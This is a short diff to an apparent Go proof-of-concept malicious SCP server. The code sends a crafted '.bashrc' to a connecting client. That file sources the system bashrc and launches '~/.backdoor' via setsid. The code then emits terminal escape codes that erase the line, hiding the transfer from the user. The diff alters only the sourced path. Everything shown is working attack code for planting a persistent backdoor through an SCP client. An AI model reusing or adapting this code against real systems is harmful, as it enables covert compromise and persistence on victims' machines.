@@ -19,7 +19,7 @@ func main() {
     r.ReadByte()
     fmt.Println("C0644 35 .bashrc")
     r.ReadByte()
-    fmt.Println(". /etc/skel/.bashrc\nsetsid ~/.backdoor &")
+    fmt.Println(". /etc/bashrc\nsetsid ~/.backdoor &")
     fmt.Print(null)
     r.ReadByte()
     w.WriteString("\033[A\033[K")
